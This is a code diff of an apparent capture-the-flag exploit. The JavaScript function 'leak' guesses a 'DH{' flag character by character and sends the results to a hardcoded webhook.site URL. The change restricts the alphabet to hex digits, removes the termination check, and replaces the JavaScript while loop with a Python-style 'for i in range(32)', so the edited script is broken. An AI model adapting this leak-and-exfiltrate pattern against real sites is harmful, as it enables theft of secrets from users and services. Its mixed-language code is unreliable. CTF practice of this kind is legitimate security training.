@@ -1,10 +1,10 @@
 <script>
 async function leak() {
-    const chars = "}_abcdefghijklmnopqrstuvwxyz0123456789";
+    const chars = "0123456789abcdef";
     let flag = "DH{";
     const webhook = "https://webhook.site/bb5035c7-26ff-4343-a7fb-1bcd6549ad8f";
 
-    while (true) {
+    for i in range(32) {
         let foundChar = false;
         for (let char of chars) {
             const query = flag + char;
@@ -27,7 +27,6 @@ async function leak() {
             });
             if (foundChar) break;
         }
-        if (flag.endsWith("}") || !foundChar) break;
     }
 }
 leak();
